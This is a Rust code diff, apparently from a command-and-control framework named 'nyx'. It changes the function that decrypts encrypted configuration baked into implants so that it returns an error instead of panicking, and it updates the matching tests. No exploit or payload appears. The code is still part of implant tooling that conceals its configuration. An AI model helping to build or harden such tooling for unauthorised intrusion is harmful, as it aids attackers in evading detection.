@@ -79,21 +79,30 @@ pub fn encrypt_with_key(
     (key, nonce, ct)
 }
 
-/// Decrypt config baked by [`encrypt`] / `embed!`. Panics on tag mismatch —
-/// in practice all material is baked at compile time, so a failure means
-/// tampering and the implant should treat it as fatal. Available in both the
-/// `std` and `no_std` feature builds.
-pub fn decrypt(key: &[u8; KEY_LEN], nonce: &[u8; NONCE_LEN], ciphertext: &[u8]) -> Vec<u8> {
+/// Decrypt config baked by [`encrypt`] / `embed!`. Returns `Err` on AEAD tag
+/// mismatch (tampering, wrong key/nonce, or a truncated/corrupted ciphertext).
+/// Available in both the `std` and `no_std` feature builds.
+///
+/// **Why this is a `Result`**: the team server also calls this, and a single
+/// corrupt config byte (Poly1305 tag mismatch) used to terminate the whole
+/// process via `.expect()`. Under `panic = "abort"` (used by the implant)
+/// there is no unwinding — the caller MUST decide what to do. The implant has
+/// no recovery path (a bad baked/patched config is fatal) and should `exit()`
+/// with a diagnostic code; the server should surface a 500 to the operator
+/// rather than die on one bad config.
+pub fn decrypt(
+    key: &[u8; KEY_LEN],
+    nonce: &[u8; NONCE_LEN],
+    ciphertext: &[u8],
+) -> Result<Vec<u8>, chacha20poly1305::Error> {
     let cipher = ChaCha20Poly1305::new(chacha20poly1305::Key::from_slice(key));
-    cipher
-        .decrypt(
-            Nonce::from_slice(nonce),
-            Payload {
-                msg: ciphertext,
-                aad: b"",
-            },
-        )
-        .expect("nyx config: decrypt failed (tampered embedded config?)")
+    cipher.decrypt(
+        Nonce::from_slice(nonce),
+        Payload {
+            msg: ciphertext,
+            aad: b"",
+        },
+    )
 }
 
 #[cfg(test)]
@@ -103,7 +112,7 @@ mod tests {
     #[test]
     fn roundtrip() {
         let (k, n, ct) = encrypt(b"hello config");
-        assert_eq!(decrypt(&k, &n, &ct), b"hello config");
+        assert_eq!(decrypt(&k, &n, &ct).expect("roundtrip"), b"hello config");
     }
 
     #[test]
@@ -112,8 +121,8 @@ mod tests {
         let (k2, n2, ct2) = encrypt(b"same");
         assert_ne!(ct1, b"same".to_vec(), "ciphertext must not equal plaintext");
         assert_ne!(ct1, ct2, "per-call key randomizes the ciphertext");
-        assert_eq!(decrypt(&k1, &n1, &ct1), b"same");
-        assert_eq!(decrypt(&k2, &n2, &ct2), b"same");
+        assert_eq!(decrypt(&k1, &n1, &ct1).expect("roundtrip"), b"same");
+        assert_eq!(decrypt(&k2, &n2, &ct2).expect("roundtrip"), b"same");
         // Wrong key must fail (AEAD integrity).
         let cipher = ChaCha20Poly1305::new(chacha20poly1305::Key::from_slice(&k2));
         assert!(cipher
@@ -131,7 +140,7 @@ mod tests {
     fn roundtrip_large_config() {
         let plain = (0..4096).map(|i| (i & 0xff) as u8).collect::<Vec<_>>();
         let (k, n, ct) = encrypt(&plain);
-        assert_eq!(decrypt(&k, &n, &ct), plain);
+        assert_eq!(decrypt(&k, &n, &ct).expect("roundtrip"), plain);
     }
 
     #[test]
@@ -142,12 +151,12 @@ mod tests {
         // The caller's key is returned verbatim.
         assert_eq!(k_out, key);
         // Round-trips through the shared decrypt path.
-        assert_eq!(decrypt(&k_out, &n1, &ct1), plain);
+        assert_eq!(decrypt(&k_out, &n1, &ct1).expect("roundtrip"), plain);
 
         // Same key, fresh nonce → different ciphertext (nonce is not reused).
         let (_k2, n2, ct2) = encrypt_with_key(plain, key);
         assert_ne!(n1, n2, "nonce must be fresh per call");
         assert_ne!(ct1, ct2, "fresh nonce under fixed key must re-randomize ct");
-        assert_eq!(decrypt(&key, &n2, &ct2), plain);
+        assert_eq!(decrypt(&key, &n2, &ct2).expect("roundtrip"), plain);
     }
 }
